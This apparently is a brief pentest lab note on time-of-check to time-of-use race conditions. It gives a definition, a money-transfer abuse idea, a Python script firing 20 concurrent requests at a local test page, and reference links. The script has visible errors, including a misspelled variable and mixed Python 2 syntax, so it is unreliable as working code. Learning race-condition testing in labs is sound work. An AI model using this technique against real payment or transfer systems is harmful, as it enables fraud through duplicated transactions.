**time-of-check to time-of-use** (**TOCTOU**, **TOCTTOU** or **TOC/TOU**) is a class of [software bugs](https://en.wikipedia.org/wiki/Software_bug "Software bug") caused by a [race condition](https://en.wikipedia.org/wiki/Race_condition "Race condition") involving the _checking_ of the state of a part of a system (such as a security credential) and the _use_ of the results of that check.



 - Transfer each other
 - Other will get more than the amount of transferred
 

  ```  import datetime
import requests
from threading import Thread

def intruder(i):
	reponse=requests.get(" http://127.0.0.1/webpen/race_condition/racer.php?test")
	print "Thread #{} - {}".format(i,response.text)

for i in range(20):
   	t=Thread(target=intruder,args=(i,))
		t.start()
```
 - https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
 - https://defuse.ca/race-conditions-in-web-applications.htm
 - https://sakurity.com/blog/2015/05/21/starbucks.html?source=post_page-------------------------
